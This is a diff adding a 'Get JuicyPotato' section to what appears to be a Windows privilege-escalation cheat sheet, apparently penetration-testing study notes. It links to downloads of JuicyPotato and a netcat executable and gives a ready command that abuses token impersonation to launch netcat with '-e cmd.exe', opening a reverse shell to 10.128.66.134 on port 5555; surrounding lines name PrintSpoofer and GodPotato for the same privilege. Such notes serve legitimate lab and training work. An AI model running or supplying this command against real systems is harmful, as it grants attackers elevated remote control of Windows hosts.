@@ -388,6 +388,15 @@ SeAssignPrimaryTokenPrivilege
 Use impersonation exploits (e.g., token impersonation techniques). \
 SeImpersonatePrivilege -> PrintSpoofer64.exe and GodPotato
 
+## Get JuicyPotato
+
+Get the exe from: https://github.com/ohpe/juicy-potato/releases
+Get the netcat exe from: https://github.com/int0x33/nc.exe/
+
+```
+.\JuicyPotato.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/c C:\Users\bruce\Desktop\nc64.exe 10.128.66.134 5555 -e cmd.exe" -t "*" -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
+```
+
 ---
 
 # 19. DLL Hijacking
